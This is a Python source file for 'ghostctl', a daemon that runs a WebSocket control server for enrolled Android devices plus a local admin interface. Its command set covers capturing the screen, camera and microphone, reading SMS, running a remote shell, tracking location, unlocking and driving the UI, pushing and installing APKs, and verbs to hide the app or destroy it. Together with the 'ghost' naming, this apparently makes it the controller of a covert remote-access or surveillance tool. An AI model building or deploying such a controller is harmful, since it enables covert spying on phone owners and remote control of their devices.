#!/usr/bin/env python3
"""ghostctl core daemon.

Device-facing WebSocket listener (default 0.0.0.0:8443) + admin JSON-RPC
listener on localhost (default 127.0.0.1:8444, used by ghostctl.py CLI).

Device protocol (JSON messages over WebSocket):
  client -> server: {"type":"hello","device_id":..,"battery":..,"ip":..,
                     "enroll_key":..,"token":..}   (last two optional)
                    {"type":"ping"}
                    {"type":"info","battery":..,"ip":..}
                    {"type":"result","cmd_id":..,"ok":true,"result":..}
                    {"type":"stream_start","stream":..,"encoding":"mjpeg","meta":..}
                    {"type":"stream_end","stream":..,"frames":N,"reason":..}
                    binary: "<json header>\\n<payload>" (MediaBus framing —
                    {"type":"frame","stream":..,"seq":..,"len":N} for live
                    media; file_chunk/file_end for device->server file streams)
  server -> client: {"type":"hello_ack","status":"approved|pending|denied",
                     "token":..}   (token echoed/issued on hello)
                    {"type":"cmd","cmd_id":..,"action":..,"args":[..]}
                    binary: file_chunk frames + text file_end (files put —
                    the FileReceiver protocol, 64 KB chunks + sha256)

Device authentication: a hello carrying a valid "token" for an APPROVED
device is trusted (status "approved", token echoed back). Otherwise a
correct "enroll_key" enrolls/re-enrolls the device as PENDING with a
fresh 32-hex token (status "pending") — pending devices may ping and
send command results but receive no commands until `ghostctl approve`.
Anything else is denied and the connection closed.

Flood protection: at most MAX_PENDING pending devices are kept (new
enrollments beyond that are denied + logged), at most MAX_PER_IP
concurrent device connections per source IP (extras are dropped +
logged), and all denials are logged to server/daemon.log.

State: server/state.json   (device registry: approved + token per device)
        server/history.json (command history)
        server/apks/        (APK store for `update` pushes, gitignored)
        server/enroll.key   (enrollment key, chmod 600, gitignored)
        server/daemon.log    (rolling daemon log incl. denials)
"""
import argparse
import asyncio
import base64
import hashlib
import hmac
import json
import os
import secrets
import sys
import time
import uuid
from collections import deque
from pathlib import Path

try:
    import websockets
except ImportError:
    sys.stderr.write("missing dependency: pip install --user websockets\n")
    raise

BASE = Path(__file__).resolve().parent
STATE_FILE = BASE / "state.json"
HISTORY_FILE = BASE / "history.json"
APK_DIR = BASE / "apks"
ENROLL_KEY_FILE = BASE / "enroll.key"
LOG_FILE = BASE / "daemon.log"

# Flood protection limits.
MAX_PENDING = 50    # total pending (unapproved) devices kept in state
MAX_PER_IP = 5      # concurrent device connections per source IP
LOG_MAX_BYTES = 512 * 1024   # daemon.log is trimmed beyond this (rolling)


# Every verb the client CommandHandler (client-main) or the PROJECT.md v1
# command spec defines. Unknown actions are rejected with a clean error.
ACTIONS = {
    # media capture
    "screen", "cam", "mic",
    # system control
    "brightness", "volume", "wake",
    # UI / sidekick-forwarded verbs
    "ui", "tap", "longclick", "type", "key", "swipe", "unlock",
    "arm", "disarm", "sidekick",
    # data
    "files", "sms", "shell", "loc", "device",
    # lifecycle
    "update", "destroy", "hide", "unhide", "status", "ping",
}

# Where `update` pushes land on the device (client SidekickInstaller default
# for the sidekick; ghostd self-update reads its own slot).
APK_DEST = {"sidekick": "/sdcard/Download/ghosta.apk",
            "self": "/sdcard/Download/ghostd.apk"}

# Server->device file push chunk size (client FileReceiver protocol).
PUSH_CHUNK = 64 * 1024


def new_token():
    """32-hex-char random device token."""
    return secrets.token_hex(16)


def load_enroll_key():
    """Enrollment key: env GHOST_ENROLL_KEY first, then server/enroll.key
    (created with a random 32-hex value + chmod 600 when missing)."""
    env = os.environ.get("GHOST_ENROLL_KEY")
    if env:
        return env.strip()
    try:
        return ENROLL_KEY_FILE.read_text().strip()
    except OSError:
        pass
    key = new_token()
    ENROLL_KEY_FILE.write_text(key + "\n")
    ENROLL_KEY_FILE.chmod(0o600)
    return key


def log(msg):
    """Timestamped line to stdout + the rolling daemon.log (trimmed)."""
    line = f"{time.strftime('%Y-%m-%d %H:%M:%S')} {msg}"
    print(line, flush=True)
    try:
        if LOG_FILE.exists() and LOG_FILE.stat().st_size > LOG_MAX_BYTES:
            lines = LOG_FILE.read_text().splitlines()
            LOG_FILE.write_text("\n".join(lines[-1000:]) + "\n")
        with LOG_FILE.open("a") as f:
            f.write(line + "\n")
    except OSError:
        pass


def is_jpeg(data):
    return bytes(data[:2]) == b"\xff\xd8"


def parse_frame(data):
    """MediaBus framing: UTF-8 JSON header + b'\\n' + payload."""
    if isinstance(data, str):
        return None
    nl = data.find(b"\n")
    if nl <= 0:
        return None
    try:
        header = json.loads(data[:nl].decode("utf-8"))
    except (UnicodeDecodeError, json.JSONDecodeError):
        return None
    if not isinstance(header, dict):
        return None
    return header, data[nl + 1:]


class StreamCache:
    """Bounded latest-frame cache for live media streams.

    Keyed by (device_id, stream). At most MAX_STREAMS keys are kept —
    the least-recently-updated stream is evicted — and each stream keeps
    only its FRAMES_PER_STREAM most recent frames. Video frames are JPEG
    payloads (screen/cam live); audio (mic live) is PCM and is stored but
    not served as image/jpeg.
    """

    MAX_STREAMS = 3
    FRAMES_PER_STREAM = 2

    def __init__(self):
        self.streams = {}  # (device_id, stream) -> {encoding, frames deque}

    def _last_ts(self, key):
        frames = self.streams[key]["frames"]
        return frames[-1][0] if frames else 0.0

    def set_encoding(self, device_id, stream, encoding):
        if not stream or not encoding:
            return
        key = (device_id, stream)
        e = self.streams.get(key)
        if e is None:
            if len(self.streams) >= self.MAX_STREAMS:
                oldest = min(self.streams, key=self._last_ts)
                del self.streams[oldest]
            e = self.streams[key] = {"encoding": None,
                                     "frames": deque(maxlen=self.FRAMES_PER_STREAM)}
        e["encoding"] = encoding

    def put(self, device_id, stream, payload, encoding=None):
        if not stream:
            return
        key = (device_id, stream)
        e = self.streams.get(key)
        if e is None:
            if len(self.streams) >= self.MAX_STREAMS:
                oldest = min(self.streams, key=self._last_ts)
                del self.streams[oldest]
            e = self.streams[key] = {
                "encoding": encoding,
                "frames": deque(maxlen=self.FRAMES_PER_STREAM),
            }
        if encoding:
            e["encoding"] = encoding
        e["frames"].append((time.time(), bytes(payload)))

    def latest(self, device_id, stream=None, jpeg_only=True):
        """Newest frame for a device (or a named stream). Returns
        (stream_name, encoding, ts, payload) or None."""
        keys = [k for k in self.streams if k[0] == device_id]
        if not keys:
            return None
        if stream is not None:
            key = (device_id, stream)
            if key not in self.streams:
                return None
        else:
            key = max(keys, key=self._last_ts)
        e = self.streams[key]
        if not e["frames"]:
            return None
        ts, payload = e["frames"][-1]
        if jpeg_only and not is_jpeg(payload):
            return None
        return key[1], e.get("encoding"), ts, payload

    def drop(self, device_id, stream):
        self.streams.pop((device_id, stream), None)

    def drop_device(self, device_id):
        for k in [k for k in self.streams if k[0] == device_id]:
            del self.streams[k]

    def listing(self):
        out = []
        for (did, stream), e in sorted(self.streams.items()):
            out.append({
                "device_id": did, "stream": stream,
                "encoding": e.get("encoding"),
                "last_frame": self._last_ts((did, stream)),
                "frames_cached": len(e["frames"]),
            })
        return out


def load_json(path, default):
    try:
        return json.loads(path.read_text())
    except (FileNotFoundError, json.JSONDecodeError):
        return default


def save_json(path, data):
    tmp = path.with_suffix(path.suffix + ".tmp")
    tmp.write_text(json.dumps(data, indent=2, sort_keys=True))
    tmp.replace(path)


class Daemon:
    def __init__(self):
        self.devices = load_json(STATE_FILE, {})  # device_id -> status dict
        self.history = load_json(HISTORY_FILE, [])
        self.conns = {}    # device_id -> websocket
        self.pending = {}  # cmd_id -> {"event","result","ok"}
        self.streams = StreamCache()
        self.enroll_key = load_enroll_key()
        self.ip_conns = {}  # source ip -> open device connection count
        log("enrollment key loaded")

    # ---------- persistence ----------
    def persist_state(self):
        save_json(STATE_FILE, self.devices)

    def persist_history(self):
        save_json(HISTORY_FILE, self.history)

    # ---------- device registry ----------
    def touch(self, device_id, online, extra=None):
        d = self.devices.setdefault(device_id, {})
        d.update({"last_seen": time.time()})
        if online is not None:
            d["online"] = online
        if extra:
            d.update(extra)
        self.persist_state()

    def device_list(self):
        return self.devices

    def pending_ids(self):
        """device_ids currently in pending (not approved) state."""
        return [d for d, rec in self.devices.items()
                if isinstance(rec, dict) and not rec.get("approved")]

    def approved(self, device_id):
        rec = self.devices.get(device_id)
        return bool(isinstance(rec, dict) and rec.get("approved"))

    # ---------- command router ----------
    async def dispatch(self, device_id, action, args, wait=10.0):
        """Send one command to one device, wait for its result."""
        if action not in ACTIONS:
            raise ValueError(f"unknown action {action!r}")
        if not self.approved(device_id):
            raise ValueError(f"device {device_id} pending approval")
        ws = self.conns.get(device_id)
        if ws is None:
            raise ConnectionError(f"device {device_id} is offline")
        cmd_id = uuid.uuid4().hex[:12]
        rec = {"event": asyncio.Event(), "result": None, "ok": False}
        self.pending[cmd_id] = rec
        entry = {"cmd_id": cmd_id, "ts": time.time(), "device_id": device_id,
                 "action": action, "args": args, "status": "pending"}
        self.history.append(entry)
        self.persist_history()
        await ws.send(json.dumps({"type": "cmd", "cmd_id": cmd_id,
                                  "action": action, "args": args}))
        try:
            await asyncio.wait_for(rec["event"].wait(), timeout=wait)
            entry["status"] = "ok" if rec["ok"] else "error"
            entry["result"] = rec["result"]
        except asyncio.TimeoutError:
            entry["status"] = "timeout"
        self.persist_history()
        return entry

    async def broadcast(self, action, args, wait=10.0):
        """Send a command to every online APPROVED device; per-device entries."""
        targets = [d for d, ws in self.conns.items()
                   if ws is not None and self.approved(d)]
        if not targets:
            return {}
        entries = await asyncio.gather(
            *(self.dispatch(d, action, args, wait=wait) for d in targets),
            return_exceptions=True)
        out = {}
        for d, e in zip(targets, entries):
            out[d] = str(e) if isinstance(e, Exception) else e
        return out

    # ---------- server -> device file push (FileReceiver protocol) ----------
    async def push_file(self, device_id, src, dest, wait=180.0):
        """Stream a local file to the device: cmd `files put <dest>` followed
        by framed 64 KB file_chunk binaries + text file_end with sha256
        (matches client-main FileReceiver). Blocks until the device ACKs."""
        if not self.approved(device_id):
            raise ValueError(f"device {device_id} pending approval")
        ws = self.conns.get(device_id)
        if ws is None:
            raise ConnectionError(f"device {device_id} is offline")
        src, dest = Path(src), str(dest)
        data = src.read_bytes()
        sha256 = hashlib.sha256(data).hexdigest()
        total, chunks = len(data), (len(data) + PUSH_CHUNK - 1) // PUSH_CHUNK
        cmd_id = uuid.uuid4().hex[:12]
        rec = {"event": asyncio.Event(), "result": None, "ok": False}
        self.pending[cmd_id] = rec
        entry = {"cmd_id": cmd_id, "ts": time.time(), "device_id": device_id,
                 "action": "files put", "args": [dest], "status": "pending"}
        self.history.append(entry)
        self.persist_history()
        await ws.send(json.dumps({"type": "cmd", "cmd_id": cmd_id,
                                  "action": "files", "args": ["put", dest]}))
        # the client now blocks inside FileReceiver.receive(dest) until the
        # frames below complete the transfer
        for seq, off in enumerate(range(0, len(data), PUSH_CHUNK)):
            payload = data[off:off + PUSH_CHUNK]
            header = {"type": "file_chunk", "seq": seq, "path": dest,
                      "len": len(payload), "total": total}
            await ws.send(json.dumps(header).encode() + b"\n" + payload)
        await ws.send(json.dumps({"type": "file_end", "path": dest,
                                   "dest": dest, "bytes": total,
                                   "chunks": chunks, "sha256": sha256}))
        try:
            await asyncio.wait_for(rec["event"].wait(), timeout=wait)
            entry["status"] = "ok" if rec["ok"] else "error"
            entry["result"] = rec["result"]
        except asyncio.TimeoutError:
            entry["status"] = "timeout"
        self.persist_history()
        return entry

    # ---------- update flow ----------
    async def update_push(self, device_id, target, apk=None):
        """`update self|sidekick [--apk path]`: push the APK to the device
        (files-put flow) then trigger the install verb (sidekick install /
        update self)."""
        if target not in APK_DEST:
            raise ValueError("update: expected 'self' or 'sidekick'")
        if apk:
            src = Path(apk).expanduser()
        else:
            src = APK_DIR / ("ghosta.apk" if target == "sidekick" else "ghostd.apk")
        if not src.is_file():
            raise FileNotFoundError(
                f"apk not found: {src} (place one first: "
                f"ghostctl.py apks add {target} <path>)")
        dest = APK_DEST[target]
        push = await self.push_file(device_id, src, dest)
        if push["status"] != "ok":
            return push
        if target == "sidekick":
            return await self.dispatch(device_id, "sidekick",
                                      ["install", dest], wait=120.0)
        return await self.dispatch(device_id, "update", ["self"], wait=120.0)

    # ---------- stream relay ----------
    def on_device_binary(self, device_id, raw):
        """Framed binary messages from a device (MediaBus framing)."""
        parsed = parse_frame(raw)
        if parsed is None:
            return
        header, payload = parsed
        mtype = header.get("type")
        if mtype == "frame":
            # live media frame — cache the latest JPEG/PCM payload
            self.streams.put(device_id, header.get("stream"), payload)
        # device->server file streams (file_chunk/file_end from `files get`)
        # are handled by the operator via the result JSON; not stored here.

    # ---------- hello / authentication ----------
    async def handle_hello(self, ws, msg):
        """Authenticate a hello message. Returns (device_id, ack) where ack
        is the hello_ack dict; device_id None => deny + close."""
        did = msg.get("device_id")
        if not did:
            return None, {"type": "hello_ack", "status": "denied"}
        rec = self.devices.setdefault(did, {})
        token = msg.get("token")
        # 1. valid token for an approved device -> trusted
        if (isinstance(token, str) and token and rec.get("approved")
                and hmac.compare_digest(str(rec.get("token", "")), token)):
            return did, {"type": "hello_ack", "status": "approved", "token": token}
        # 2. valid enroll key -> create/reuse a pending entry, new token
        enroll = msg.get("enroll_key")
        if isinstance(enroll, str) and enroll and \
                hmac.compare_digest(self.enroll_key, enroll):
            was_pending = not rec.get("approved")
            if not was_pending and len(self.pending_ids()) >= MAX_PENDING:
                log(f"denied hello from {did} "
                    f"({ws.remote_address[0]}): pending device limit "
                    f"({MAX_PENDING}) reached")
                return None, {"type": "hello_ack", "status": "denied"}
            token = new_token()
            return did, {"type": "hello_ack", "status": "pending", "token": token}
        # 3. bad/missing credentials -> deny
        why = "bad token" if token else ("bad enroll key" if enroll
                                         else "no credentials")
        log(f"denied hello from {did} ({ws.remote_address[0]}): {why}")
        return None, {"type": "hello_ack", "status": "denied"}

    # ---------- websocket device handler ----------
    async def device_handler(self, ws):
        device_id = None
        ip = (ws.remote_address or (None,))[0] or "?"
        if self.ip_conns.get(ip, 0) >= MAX_PER_IP:
            log(f"dropped device connection from {ip}: per-IP limit "
                f"({MAX_PER_IP}) reached")
            await ws.close()
            return
        self.ip_conns[ip] = self.ip_conns.get(ip, 0) + 1
        try:
            async for raw in ws:
                if isinstance(raw, (bytes, bytearray)):
                    if device_id is not None:
                        self.on_device_binary(device_id, raw)
                    continue
                try:
                    msg = json.loads(raw)
                except json.JSONDecodeError:
                    continue
                mtype = msg.get("type")
                if mtype == "hello":
                    if device_id is not None:
                        continue  # already authenticated on this connection
                    did, ack = await self.handle_hello(ws, msg)
                    await ws.send(json.dumps(ack))
                    if did is None:
                        await ws.close()
                        return
                    device_id = did
                    approved = ack["status"] == "approved"
                    token = ack["token"]
                    self.conns[device_id] = ws
                    self.touch(device_id, online=True,
                               extra={"battery": msg.get("battery"),
                                      "ip": msg.get("ip") or ip,
                                      "version": msg.get("version"),
                                      "approved": approved,
                                      "token": token})
                    log(f"device {device_id} hello_ack "
                        f"{ack['status']} from {ip}")
                elif device_id is None:
                    continue
                elif mtype == "ping":
                    # heartbeats accepted from pending and approved devices
                    self.touch(device_id, online=None)
                    await ws.send(json.dumps({"type": "pong"}))
                elif mtype == "info":
                    self.touch(device_id, online=None,
                               extra={"battery": msg.get("battery"),
                                      "ip": msg.get("ip")})
                elif mtype == "stream_start":
                    self.streams.set_encoding(device_id, msg.get("stream"),
                                              msg.get("encoding"))
                elif mtype == "stream_end":
                    self.streams.drop(device_id, msg.get("stream"))
                elif mtype == "result":
                    # command results accepted from pending + approved devices
                    rec = self.pending.pop(msg.get("cmd_id"), None)
                    if rec:
                        rec["ok"] = bool(msg.get("ok", True))
                        rec["result"] = msg.get("result")
                        rec["event"].set()
        finally:
            self.ip_conns[ip] = max(0, self.ip_conns.get(ip, 1) - 1)
            if not self.ip_conns[ip]:
                del self.ip_conns[ip]
            if device_id and self.conns.get(device_id) is ws:
                del self.conns[device_id]
                self.touch(device_id, online=False)
                self.streams.drop_device(device_id)

    # ---------- admin (CLI) handler: newline-delimited JSON ----------
    async def admin_handler(self, reader, writer):
        try:
            while True:
                line = await reader.readline()
                if not line:
                    break
                try:
                    req = json.loads(line)
                except json.JSONDecodeError:
                    resp = {"ok": False, "error": "bad json"}
                else:
                    resp = await self.admin_dispatch(req)
                writer.write((json.dumps(resp) + "\n").encode())
                await writer.drain()
        except (ConnectionResetError, BrokenPipeError):
            pass
        finally:
            writer.close()

    async def admin_dispatch(self, req):
        op = req.get("op")
        try:
            if op in ("list", "status", "devices"):
                return {"ok": True, "devices": self.device_list()}
            if op == "pending":
                out = {d: self.devices[d] for d in self.pending_ids()}
                return {"ok": True, "pending": out}
            if op == "approve":
                did = req["device_id"]
                if did not in self.devices:
                    return {"ok": False, "error": f"unknown device {did}"}
                self.touch(did, online=None, extra={"approved": True})
                log(f"device {did} approved via admin")
                return {"ok": True, "device_id": did, "approved": True}
            if op == "revoke":
                did = req["device_id"]
                if did not in self.devices:
                    return {"ok": False, "error": f"unknown device {did}"}
                token = new_token()  # rotate: a stolen token dies
                self.touch(did, online=None,
                           extra={"approved": False, "token": token})
                log(f"device {did} revoked via admin (token rotated)")
                return {"ok": True, "device_id": did, "approved": False}
            if op == "streams":
                return {"ok": True, "streams": self.streams.listing()}
            if op == "stream_frame":
                fr = self.streams.latest(req["device_id"], req.get("stream"))
                if fr is None:
                    return {"ok": False,
                            "error": f"no cached jpeg frame for {req['device_id']}"
                                     f"{'' if not req.get('stream') else ' ' + req['stream']}"}
                stream, encoding, ts, payload = fr
                return {"ok": True, "stream": stream, "encoding": encoding,
                        "ts": ts, "frame_b64": base64.b64encode(payload).decode()}
            if op == "update":
                entry = await self.update_push(req["device_id"], req.get("target"),
                                               req.get("apk"))
                return {"ok": entry.get("status") == "ok", "entry": entry}
            if op == "command":
                action, args = req["action"], req.get("args", [])
                wait = float(req.get("wait", 10))
                if req.get("all"):
                    return {"ok": True, "broadcast": True,
                            "results": await self.broadcast(action, args, wait)}
                entry = await self.dispatch(req["device_id"], action, args, wait)
                return {"ok": entry["status"] == "ok", "entry": entry}
            return {"ok": False, "error": f"unknown op {op!r}"}
        except Exception as e:  # noqa: BLE001 - report to CLI
            return {"ok": False, "error": str(e)}

    async def run(self, bind, port, admin_host, admin_port):
        admin = await asyncio.start_server(self.admin_handler, admin_host, admin_port)
        # max_size 32 MiB: screen-shot PNGs arrive base64-inflated in one
        # command response; the default 1 MiB rejected them.
        async with websockets.serve(self.device_handler, bind, port,
                                    max_size=32 * 1024 * 1024):
            log(f"ghostctl daemon: devices ws://{bind}:{port}, "
                f"admin {admin_host}:{admin_port}")
            async with admin:
                await admin.serve_forever()


def main():
    p = argparse.ArgumentParser(description="ghostctl core daemon")
    p.add_argument("--bind", default="0.0.0.0")
    p.add_argument("--port", type=int, default=8443)
    p.add_argument("--admin-host", default="127.0.0.1")
    p.add_argument("--admin-port", type=int, default=8444)
    a = p.parse_args()
    asyncio.run(Daemon().run(a.bind, a.port, a.admin_host, a.admin_port))


if __name__ == "__main__":
    main()
